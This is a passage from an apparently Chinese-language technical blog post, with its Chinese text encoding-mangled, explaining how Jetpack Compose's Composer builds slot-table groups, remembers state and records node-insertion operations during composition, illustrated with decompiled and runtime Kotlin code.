            <span class="hljs-type">Object</span> <span class="hljs-variable">value$iv</span> <span class="hljs-operator">=</span> DemoKt::Count$lambda$<span class="hljs-number">4</span>$lambda$<span class="hljs-number">3</span>;
            $composer.updateRememberedValue(value$iv);
            var10000 = value$iv;
        }

        <span class="hljs-type">Function0</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> (Function0)var10000;
        
        <span class="hljs-comment">// ç»“æŸ ReplaceGroup</span>
        $composer.endReplaceGroup();
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤8: è°ƒç”¨ Button Composable</span>
        <span class="hljs-comment">// Button å†…éƒ¨ä¼šåˆ›å»ºè‡ªå·±çš„ Groups</span>
        <span class="hljs-comment">// æœ€åä¸€ä¸ªå‚æ•°æ˜¯ content lambdaï¼Œä½¿ç”¨ rememberComposableLambda åŒ…è£…</span>
        <span class="hljs-comment">// ============================================================</span>
        ButtonKt.Button(
            var13,                    <span class="hljs-comment">// onClick</span>
            (Modifier)<span class="hljs-literal">null</span>,           <span class="hljs-comment">// modifier</span>
            <span class="hljs-literal">false</span>,                    <span class="hljs-comment">// enabled</span>
            (Shape)<span class="hljs-literal">null</span>,              <span class="hljs-comment">// shape</span>
            (ButtonColors)<span class="hljs-literal">null</span>,       <span class="hljs-comment">// colors</span>
            (ButtonElevation)<span class="hljs-literal">null</span>,    <span class="hljs-comment">// elevation</span>
            (BorderStroke)<span class="hljs-literal">null</span>,       <span class="hljs-comment">// border</span>
            (PaddingValues)<span class="hljs-literal">null</span>,      <span class="hljs-comment">// contentPadding</span>
            (MutableInteractionSource)<span class="hljs-literal">null</span>, <span class="hljs-comment">// interactionSource</span>
            <span class="hljs-comment">// content lambda - ä½¿ç”¨ rememberComposableLambda ç¼“å­˜</span>
            (Function3)ComposableLambdaKt.rememberComposableLambda(
                <span class="hljs-number">1836707247</span>,           <span class="hljs-comment">// key</span>
                <span class="hljs-literal">true</span>,                 <span class="hljs-comment">// tracked</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function3</span>() {     <span class="hljs-comment">// lambda å®ç°</span>
                    <span class="hljs-meta">@Composable</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(RowScope $<span class="hljs-built_in">this</span>$Button, Composer $composer, <span class="hljs-type">int</span> $changed)</span> {
                        <span class="hljs-comment">// ... Text(content.toString()) ...</span>
                    }
                    <span class="hljs-comment">// ...</span>
                },
                $composer,
                <span class="hljs-number">54</span>
            ),
            $composer,
            <span class="hljs-number">805306368</span>,               <span class="hljs-comment">// $changed</span>
            <span class="hljs-number">510</span>                      <span class="hljs-comment">// $default</span>
        );
        
        <span class="hljs-keyword">if</span> (ComposerKt.isTraceInProgress()) {
            ComposerKt.traceEventEnd();
        }
    }

    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤9: ç»“æŸ RestartGroup å¹¶æ³¨å†Œé‡ç»„å›è°ƒ</span>
    <span class="hljs-comment">// endRestartGroup è¿”å› ScopeUpdateScopeï¼Œç”¨äºæ³¨å†Œé‡ç»„ lambda</span>
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-type">ScopeUpdateScope</span> <span class="hljs-variable">var21</span> <span class="hljs-operator">=</span> $composer.endRestartGroup();
    <span class="hljs-keyword">if</span> (var21 != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// æ³¨å†Œé‡ç»„å›è°ƒï¼šå½“éœ€è¦é‡ç»„æ—¶ï¼Œè°ƒç”¨ Count$lambda$5</span>
        var21.updateScope(DemoKt::Count$lambda$<span class="hljs-number">5</span>);
    }
}

<span class="hljs-comment">// é‡ç»„æ—¶è°ƒç”¨çš„ lambda</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Unit Count$lambda$<span class="hljs-number">5</span>(<span class="hljs-type">int</span> $$changed, Composer $composer, <span class="hljs-type">int</span> $force) {
    Count($composer, RecomposeScopeImplKt.updateChangedFlags($$changed | <span class="hljs-number">1</span>));
    <span class="hljs-keyword">return</span> Unit.INSTANCE;
}
</code></pre>
<p>ä¸‹é¢è§£æCountå‡½æ•°</p>
<h3 data-id="heading-18">startRestartGroup(-1491082337)</h3>
<p><code>startRestartGroup</code>ç”¨äºåˆ›å»ºå¯ä»¥é‡å¤æ‰§è¡Œçš„ç»„ï¼Œåªè¦è°ƒç”¨äº†<code>startRestartGroup</code>ï¼Œå‡½æ•°å°±å¯ä»¥è¢«é‡æ–°æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@ComposeCompilerApi</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startRestartGroup</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>)</span></span>: Composer {
    <span class="hljs-comment">// åˆ›å»ºç»„</span>
    startReplaceGroup(key)
    <span class="hljs-comment">// ä¿å­˜é‡ç»„ä½œç”¨åŸŸå¯¹è±¡</span>
    addRecomposeScope()
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
}
</code></pre>
<p><code>startReplaceGroup</code>å°±æ˜¯åˆ›å»ºkeyä¸º-1491082337ï¼Œ<code>writer.startGroup</code>åœ¨ä¹‹å‰è®²è§£è¿‡ï¼Œè¿™é‡Œå°±ä¸é‡å¤äº†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startReplaceGroup</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-keyword">val</span> reader = reader
    <span class="hljs-keyword">if</span> (inserting) {
        reader.beginEmpty()
        <span class="hljs-comment">// åˆ›å»ºç»„ï¼Œkeyä¸ºç¼–è¯‘å™¨ç”Ÿæˆçš„-1491082337</span>
        writer.startGroup(key, Composer.Empty)
        enterGroup(<span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span>
    }
}
</code></pre>
<h3 data-id="heading-19">addRecomposeScope</h3>
<p>åˆ›å»ºé‡ç»„ä½œç”¨åŸŸå¯¹è±¡ï¼Œæ”¾å…¥åˆ°å¤±æ•ˆæ ˆä¸­ï¼Œä¿å­˜åˆ°<code>slots</code>æ•°ç»„ã€‚æ¯ä¸ªå¯ä»¥é‡æ–°æ‰§è¡Œçš„å‡½æ•°ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªé‡ç»„ä½œç”¨åŸŸå¯¹è±¡ã€‚åˆ›å»ºé‡ç»„ä½œç”¨åŸŸé‡Œé¢æœ‰ä¸ª<code>block</code>å±æ€§ï¼Œ<code>block</code>å±æ€§å°±æ˜¯éœ€è¦é‡æ–°æ‰§è¡Œçš„<code>Count</code>å‡½æ•°ã€‚é‡ç»„çš„æ—¶å€™ä¼šå–å‡ºé‡ç»„ä½œç”¨åŸŸå¯¹è±¡ï¼Œè°ƒç”¨<code>block</code>ï¼Œé‡æ–°æ‰§è¡Œ<code>Count</code>å‡½æ•°ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">addRecomposeScope</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// ç»„åˆçš„æ—¶å€™ä¸ºtrueï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡æ‰§è¡Œcountå‡½æ•°ä¸ºfalseã€‚é‡ç»„çš„æ—¶å€™ä¸ºfalseï¼Œé‡æ–°æ‰§è¡Œcountå‡½æ•°ä¸ºfalse</span>
    <span class="hljs-keyword">if</span> (inserting) {
        <span class="hljs-comment">// åˆ›å»ºé‡ç»„ä½œç”¨åŸŸå¯¹è±¡</span>
        <span class="hljs-keyword">val</span> scope = RecomposeScopeImpl(composition <span class="hljs-keyword">as</span> CompositionImpl)
        invalidateStack.push(scope)
        <span class="hljs-comment">// ä¿å­˜åˆ°slotsæ•°ç»„</span>
        updateValue(scope)
        enterRecomposeScope(scope)
    } <span class="hljs-keyword">else</span> {
       <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç ï¼Œé‡ç»„çš„æ—¶å€™ä¼šæ‰§è¡Œåé¢çš„ä»£ç </span>
    }
}    
</code></pre>
<p>æ­¤æ—¶æ•°ç»„çŠ¶æ€</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">Group</span> <span class="hljs-number">0</span>: Root <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">1</span>: KeyHash <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots[<span class="hljs-number">0</span>]: content lambda (setContent ä¼ å…¥çš„ lambda)
â””â”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">2</span>: Invocation <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = invocationKey)
â””â”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">3</span>: <span class="hljs-keyword">key</span> = -<span class="hljs-number">1491082337</span>
â””â”€â”€ slots[<span class="hljs-number">1</span>]: RecomposeScopeImpl // é‡ç»„ä½œç”¨åŸŸå¯¹è±¡
</code></pre>
<h3 data-id="heading-20">remember { mutableStateOf(0) }</h3>
<p>rememberä¸åˆ›å»ºæ–°çš„ç»„ï¼Œå®ƒé€šè¿‡Â <code>rememberedValue()</code>Â å’ŒÂ <code>updateRememberedValue()</code>Â æ“ä½œå½“å‰ç»„çš„slotæ•°ç»„ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é¦–æ¬¡ç»„åˆæ—¶ rememberedValue() è¿”å›Empty</span>
Object it$iv$iv = $composer.rememberedValue();  <span class="hljs-comment">// è¿”å› Composer.Empty</span>

<span class="hljs-comment">// å› ä¸ºæ˜¯ Emptyï¼Œåˆ›å»ºæ–°çš„MutableState</span>
Object value$iv$iv = SnapshotStateKt.mutableStateOf$default(<span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>, <span class="hljs-literal">null</span>);

<span class="hljs-comment">// å­˜å‚¨åˆ° slot</span>
$composer.updateRememberedValue(value$iv$iv);
</code></pre>
<p><strong>updateRememberedValue è°ƒç”¨ updateCachedValue:</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateRememberedValue</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>?)</span></span> = updateCachedValue(value)

<span class="hljs-comment">// Composer.kt ç¬¬ 2213-2224 è¡Œ</span>
<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateCachedValue</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">val</span> toStore = <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">is</span> RememberObserver) {
        <span class="hljs-comment">// MutableState ä¸æ˜¯ RememberObserverï¼Œç›´æ¥ä½¿ç”¨</span>
        <span class="hljs-comment">// ...</span>
    } <span class="hljs-keyword">else</span> value
    updateValue(toStore)  <span class="hljs-comment">// å­˜å‚¨åˆ° slot</span>
}
</code></pre>
<p>æ­¤æ—¶æ•°ç»„çŠ¶æ€</p>
<pre><code class="hljs language-ini" lang="ini">Group 0: Root Group (<span class="hljs-attr">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ Group 1: KeyHash Group (<span class="hljs-attr">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots<span class="hljs-section">[0]</span>: content lambda (setContent ä¼ å…¥çš„ lambda)
â””â”€â”€ Group 2: Invocation Group (<span class="hljs-attr">key</span> = invocationKey)
â””â”€â”€ Group 3: <span class="hljs-attr">key</span> = -<span class="hljs-number">1491082337</span>
â””â”€â”€ slots<span class="hljs-section">[1]</span>: RecomposeScopeImpl // é‡ç»„ä½œç”¨åŸŸå¯¹è±¡
â””â”€â”€ slots<span class="hljs-section">[2]</span>: MutableState&lt;Int&gt;(<span class="hljs-attr">value</span>=<span class="hljs-number">0</span>)  // remember çš„å€¼
</code></pre>
<h3 data-id="heading-21">startReplaceGroup(-548075111) - onClick lambdaç¼“å­˜</h3>
<p>ä¸ºonClick lambdaåˆ›å»ºgroupï¼Œkeyä¸º-548075111</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-variable">$composer</span>.startReplaceGroup(-548075111);
</code></pre>
<h3 data-id="heading-22">endReplaceGroup() - ç»“æŸ onClick ç¼“å­˜ç»„</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SlotWriter.endGroup() æ›´æ–° Group å¤§å°</span>
groups<span class="hljs-selector-class">.updateGroupSize</span>(groupAddress, newGroupSize)  <span class="hljs-comment">// Size = 1</span>
groups<span class="hljs-selector-class">.updateNodeCount</span>(groupAddress, newNodes)      <span class="hljs-comment">// nodeCount = 0</span>
</code></pre>
<p>æ­¤æ—¶æ•°ç»„çŠ¶æ€</p>
<pre><code class="hljs language-ini" lang="ini">Group 0: Root Group (<span class="hljs-attr">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ Group 1: KeyHash Group (<span class="hljs-attr">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots<span class="hljs-section">[0]</span>: content lambda (setContent ä¼ å…¥çš„ lambda)
â””â”€â”€ Group 2: Invocation Group (<span class="hljs-attr">key</span> = invocationKey)
â””â”€â”€ Group 3: <span class="hljs-attr">key</span> = -<span class="hljs-number">1491082337</span>
â””â”€â”€ slots<span class="hljs-section">[1]</span>: RecomposeScopeImpl // é‡ç»„ä½œç”¨åŸŸå¯¹è±¡
â””â”€â”€ slots<span class="hljs-section">[2]</span>: MutableState&lt;Int&gt;(<span class="hljs-attr">value</span>=<span class="hljs-number">0</span>)  // remember çš„å€¼
â””â”€â”€ Group 4: <span class="hljs-attr">key</span> = -<span class="hljs-number">548075111</span>
â””â”€â”€ slots<span class="hljs-section">[3]</span>: content$delegate (MutableState å¼•ç”¨ï¼Œç”¨äº changed æ£€æµ‹)
â””â”€â”€ slots<span class="hljs-section">[4]</span>: Function0 (onClick lambda)
</code></pre>
<h3 data-id="heading-23">Buttonå’ŒTextç»„ä»¶</h3>
<p>æœ€ç»ˆä¼šè°ƒç”¨åˆ°ReusableComposeNodeï¼Œfactoryå…¶å®å°±æ˜¯ç”¨æ¥åˆ›å»ºLayoutNodeå¯¹è±¡ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any, <span class="hljs-keyword">reified</span> E : Applier&lt;*&gt;</span>&gt; <span class="hljs-title">ReusableComposeNode</span><span class="hljs-params">(
    <span class="hljs-keyword">noinline</span> factory: () -&gt; <span class="hljs-type">T</span>,
    update: @<span class="hljs-type">DisallowComposableCalls</span> <span class="hljs-type">Updater</span>&lt;<span class="hljs-type">T</span>&gt;.() -&gt; <span class="hljs-type">Unit</span>,
)</span></span> {
    <span class="hljs-keyword">if</span> (currentComposer.applier !<span class="hljs-keyword">is</span> E) invalidApplier()
    <span class="hljs-comment">// åˆ›å»ºå¯å¤ç”¨çš„èŠ‚ç‚¹</span>
    currentComposer.startReusableNode()
    <span class="hljs-keyword">if</span> (currentComposer.inserting) {
        <span class="hljs-comment">// ç»„åˆçš„æ—¶å€™ï¼Œåˆ›å»ºèŠ‚ç‚¹</span>
        currentComposer.createNode(factory)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// é‡ç»„çš„æ—¶å€™ï¼Œç›´æ¥å¤ç”¨èŠ‚ç‚¹</span>
        currentComposer.useNode()
    }
    Updater&lt;T&gt;(currentComposer).update()
    <span class="hljs-comment">// ç»“æŸèŠ‚ç‚¹</span>
    currentComposer.endNode()
}
</code></pre>
<h3 data-id="heading-24">startReusableNode</h3>
<p>åˆ›å»ºå¯å¤ç”¨çš„èŠ‚ç‚¹ï¼Œkeyä¸º125ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startReusableNode</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åˆ›å»ºå¯å¤ç”¨çš„èŠ‚ç‚¹ï¼Œkeyä¸º125</span>
    start(nodeKey, <span class="hljs-literal">null</span>, GroupKind.ReusableNode, <span class="hljs-literal">null</span>)
    nodeExpected = <span class="hljs-literal">true</span>
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>, objectKey: <span class="hljs-type">Any</span>?, kind: <span class="hljs-type">GroupKind</span>, <span class="hljs-keyword">data</span>: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-comment">// æ˜¯èŠ‚ç‚¹</span>
    <span class="hljs-keyword">val</span> isNode = kind.isNode
    <span class="hljs-keyword">if</span> (inserting) {
        reader.beginEmpty()
        <span class="hljs-keyword">val</span> startIndex = writer.currentGroup
        <span class="hljs-keyword">when</span> {
            <span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span>
            isNode -&gt; writer.startNode(key, Composer.Empty)
            <span class="hljs-keyword">data</span> != <span class="hljs-literal">null</span> -&gt; writer.startData(key, objectKey ?: Composer.Empty, <span class="hljs-keyword">data</span>)
            <span class="hljs-keyword">else</span> -&gt; writer.startGroup(key, objectKey ?: Composer.Empty)
        }
        pending?.let { pending -&gt;
            <span class="hljs-keyword">val</span> insertKeyInfo =
                KeyInfo(
                    key = key,
                    objectKey = -<span class="hljs-number">1</span>,
                    location = insertedGroupVirtualIndex(startIndex),
                    nodes = -<span class="hljs-number">1</span>,
                    index = <span class="hljs-number">0</span>,
                )
            pending.registerInsert(insertKeyInfo, nodeIndex - pending.startIndex)
            pending.recordUsed(insertKeyInfo)
        }
        enterGroup(isNode, <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span>
    }
    <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç </span>
}    
</code></pre>
<h3 data-id="heading-25">writer.startNode(key, Composer.Empty)</h3>
<p>è¿˜æ˜¯è°ƒç”¨startGroupï¼Œåªä¸è¿‡isNodeä¸ºtrue</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startNode</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>, objectKey: <span class="hljs-type">Any</span>?)</span></span> =
    startGroup(key, objectKey, isNode = <span class="hljs-literal">true</span>, aux = Composer.Empty)
</code></pre>
<p>æ­¤æ—¶æ•°ç»„çŠ¶æ€</p>
<pre><code class="hljs language-ini" lang="ini">Group 0: Root Group (<span class="hljs-attr">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ Group 1: KeyHash Group (<span class="hljs-attr">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots<span class="hljs-section">[0]</span>: content lambda (setContent ä¼ å…¥çš„ lambda)
â””â”€â”€ Group 2: Invocation Group (<span class="hljs-attr">key</span> = invocationKey)
â””â”€â”€ Group 3: <span class="hljs-attr">key</span> = -<span class="hljs-number">1491082337</span>
â””â”€â”€ slots<span class="hljs-section">[1]</span>: RecomposeScopeImpl // é‡ç»„ä½œç”¨åŸŸå¯¹è±¡
â””â”€â”€ slots<span class="hljs-section">[2]</span>: MutableState&lt;Int&gt;(<span class="hljs-attr">value</span>=<span class="hljs-number">0</span>)  // remember çš„å€¼
â””â”€â”€ Group 4: <span class="hljs-attr">key</span> = -<span class="hljs-number">548075111</span>
â””â”€â”€ slots<span class="hljs-section">[3]</span>: content$delegate (MutableState å¼•ç”¨ï¼Œç”¨äº changed æ£€æµ‹)
â””â”€â”€ slots<span class="hljs-section">[4]</span>: Function0 (onClick lambda)
â””â”€â”€ Group 5: <span class="hljs-attr">key</span> = <span class="hljs-number">125</span>ï¼Œgroupinfoé‡Œé¢è®°å½•çš„isNodeä¸º<span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-26">createNode</h3>
<p>åœ¨é¦–æ¬¡ç»„åˆæ—¶è°ƒç”¨ï¼Œä¸ä¼šç«‹å³åˆ›å»ºèŠ‚ç‚¹ï¼Œè€Œæ˜¯å°†åˆ›å»ºæ“ä½œè®°å½•åˆ°FixupListã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Suppress(<span class="hljs-string">"UNUSED"</span>)</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">createNode</span><span class="hljs-params">(factory: () -&gt; <span class="hljs-type">T</span>)</span></span> {
    validateNodeExpected()
    runtimeCheck(inserting) { <span class="hljs-string">"createNode() can only be called when inserting"</span> }
    <span class="hljs-comment">// æ’å…¥çš„ä½ç½®</span>
    <span class="hljs-keyword">val</span> insertIndex = parentStateStack.peek()
    <span class="hljs-comment">// æŒ‡å‘slotsæ•°ç»„ä¸­çš„ä½ç½®</span>
    <span class="hljs-keyword">val</span> groupAnchor = writer.anchor(writer.parent)
    groupNodeCount++
    <span class="hljs-comment">// è®°å½•åˆ° FixupListï¼Œå»¶è¿Ÿæ‰§è¡Œ</span>
    insertFixups.createAndInsertNode(factory, insertIndex, groupAnchor)
}
</code></pre>
<p><code>FixupList.createAndInsertNode</code>æ–¹æ³•å°±æ˜¯å°†èŠ‚ç‚¹æ”¾åˆ°<code>operations</code>é‡Œé¢ï¼Œ<code>InsertNodeFixup</code>ä¼šè°ƒç”¨<code>Applier</code>çš„<code>insertTopDown</code>æ–¹æ³•ï¼Œ<code>PostInsertNodeFixup</code>ä¼šè°ƒç”¨<code>Applier</code>çš„<code>insertBottomUp</code>æ–¹æ³•ã€‚å…³äº<code>Applier</code>ï¼Œåé¢ä¼šè®²ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createAndInsertNode</span><span class="hljs-params">(factory: () -&gt; <span class="hljs-type">Any</span>?, insertIndex: <span class="hljs-type">Int</span>, groupAnchor: <span class="hljs-type">Anchor</span>)</span></span> {
    <span class="hljs-comment">// 1. InsertNodeFixup: åˆ›å»ºèŠ‚ç‚¹å¹¶è°ƒç”¨Applierçš„insertTopDownæ–¹æ³•</span>
    operations.push(InsertNodeFixup) {
        setObject(InsertNodeFixup.Factory, factory)
        setInt(InsertNodeFixup.InsertIndex, insertIndex)
        setObject(InsertNodeFixup.GroupAnchor, groupAnchor)
    }
    <span class="hljs-comment">// 2. PostInsertNodeFixup: å­èŠ‚ç‚¹å¤„ç†å®Œåè°ƒç”¨Applierçš„insertBottomUpæ–¹æ³•</span>
    pendingOperations.push(PostInsertNodeFixup) {
        setInt(PostInsertNodeFixup.InsertIndex, insertIndex)
        setObject(PostInsertNodeFixup.GroupAnchor, groupAnchor)
    }
}
</code></pre>
<p>Operationså†…éƒ¨æœ‰ä¸ªé›†åˆï¼Œè°ƒç”¨Operations.pushå°±æ˜¯å°†èŠ‚ç‚¹ä¿å­˜åˆ°é›†åˆã€‚ä»€ä¹ˆæ—¶å€™å–å‡ºèŠ‚ç‚¹å‘¢ï¼Ÿåé¢å†è®²ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">push</span><span class="hljs-params">(operation: <span class="hljs-type">Operation</span>, args: <span class="hljs-type">WriteScope</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    contract { callsInPlace(args, EXACTLY_ONCE) }

    <span class="hljs-meta">@OptIn(InternalComposeApi::class)</span> 
    <span class="hljs-comment">// ä¿å­˜åˆ°é›†åˆ</span>
    pushOp(operation)
    WriteScope(<span class="hljs-keyword">this</span>).args()

    ensureAllArgumentsPushedFor(operation)
}
</code></pre>
<p>åœ¨ç»„åˆè¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰å¯¹SlotTableå’ŒèŠ‚ç‚¹æ ‘çš„ä¿®æ”¹éƒ½è¢«è®°å½•åˆ°<code>ChangeList</code>ä¸­ï¼š</p>
<h3 data-id="heading-27">ä¸»è¦ Operation ç±»å‹</h3>




























































<table><thead><tr><th>Operation</th><th>ä½œç”¨</th><th>ç›®æ ‡</th></tr></thead><tbody><tr><td><code>InsertNodeFixup</code></td><td>åˆ›å»ºèŠ‚ç‚¹å¹¶ insertTopDown</td><td>Applier</td></tr><tr><td><code>PostInsertNodeFixup</code></td><td>æ‰§è¡Œ insertBottomUp</td><td>Applier</td></tr><tr><td><code>UpdateNode</code></td><td>æ›´æ–°èŠ‚ç‚¹å±æ€§</td><td>Applier</td></tr><tr><td><code>RemoveNode</code></td><td>ä»æ ‘ä¸­ç§»é™¤èŠ‚ç‚¹</td><td>Applier</td></tr><tr><td><code>MoveNode</code></td><td>ç§»åŠ¨èŠ‚ç‚¹ä½ç½®</td><td>Applier</td></tr><tr><td><code>Ups</code> / <code>Downs</code></td><td>å¯¼èˆª Applier çš„å½“å‰ä½ç½®</td><td>Applier</td></tr><tr><td><code>InsertSlots</code></td><td>å°† Slots æ’å…¥ SlotTable</td><td>SlotWriter</td></tr><tr><td><code>RemoveCurrentGroup</code></td><td>åˆ é™¤å½“å‰ Group</td><td>SlotWriter</td></tr><tr><td><code>MoveCurrentGroup</code></td><td>ç§»åŠ¨ Group</td><td>SlotWriter</td></tr><tr><td><code>UpdateValue</code></td><td>æ›´æ–° Slot å€¼</td><td>SlotWriter</td></tr></tbody></table>
<h3 data-id="heading-28">Operation çš„æ‰§è¡Œç›®æ ‡</h3>
<p>æ¯ä¸ª Operation çš„ <code>execute</code> æ–¹æ³•æ¥æ”¶ä¸‰ä¸ªå…³é”®å‚æ•°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> OperationArgContainer.<span class="hljs-title">execute</span><span class="hljs-params">(
    applier: <span class="hljs-type">Applier</span>&lt;*&gt;,      <span class="hljs-comment">// ç”¨äºæ“ä½œèŠ‚ç‚¹æ ‘</span>
    slots: <span class="hljs-type">SlotWriter</span>,         <span class="hljs-comment">// ç”¨äºæ“ä½œ SlotTable</span>
    rememberManager: <span class="hljs-type">RememberManager</span>,  <span class="hljs-comment">// ç”¨äºç”Ÿå‘½å‘¨æœŸç®¡ç†</span>
    errorContext: <span class="hljs-type">OperationErrorContext</span>?,
)</span></span>
</code></pre>
<p>ç»„åˆé˜¶æ®µ<strong>ä¸ç›´æ¥ä¿®æ”¹</strong>Â LayoutNodeæ ‘ï¼Œè€Œæ˜¯å°†æ‰€æœ‰æ“ä½œè®°å½•åˆ°ChangeListã€‚è¿™æ ·åšçš„å¥½å¤„ï¼š</p>
<ul>
<li>å¯ä»¥æ‰¹é‡åº”ç”¨å˜æ›´ï¼Œå‡å°‘ UI æŠ–åŠ¨ã€‚</li>
<li>æ”¯æŒå–æ¶ˆå’Œæ¢å¤ã€‚</li>
</ul>
<h3 data-id="heading-29">endNode</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">endNode</span><span class="hljs-params">()</span></span> = end(isNode = <span class="hljs-literal">true</span>)

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">end</span><span class="hljs-params">(isNode: <span class="hljs-type">Boolean</span>)</span></span> {
    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ï¼Œç›´æ¥çœ‹å…³é”®çš„recordInsert</span>
    recordInsert(insertAnchor)
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">recordInsert</span><span class="hljs-params">(anchor: <span class="hljs-type">Anchor</span>)</span></span> {
    <span class="hljs-keyword">if</span> (insertFixups.isEmpty()) {
        changeListWriter.insertSlots(anchor, insertTable)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ä¹‹å‰è°ƒç”¨createNodeçš„æ—¶å€™ï¼ŒèŠ‚ç‚¹è¢«æ”¾åˆ°insertFixupsï¼Œæ‰€ä»¥insertFixupsä¸ä¸ºç©º</span>
        changeListWriter.insertSlots(anchor, insertTable, insertFixups)
        insertFixups = FixupList()
    }
}
</code></pre>
<p>ChanheList.pushInsertSlotsæ–¹æ³•ï¼Œfixupså‚æ•°ä¿å­˜äº†ä¹‹å‰åˆ›å»ºçš„èŠ‚ç‚¹ã€‚åˆ›å»ºçš„Buttonã€Textç­‰èŠ‚ç‚¹éƒ½è¢«ä¿å­˜åˆ°äº†Operationsé‡Œé¢ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">pushInsertSlots</span><span class="hljs-params">(anchor: <span class="hljs-type">Anchor</span>, from: <span class="hljs-type">SlotTable</span>, fixups: <span class="hljs-type">FixupList</span>)</span></span> {
    operations.push(InsertSlotsWithFixups) {
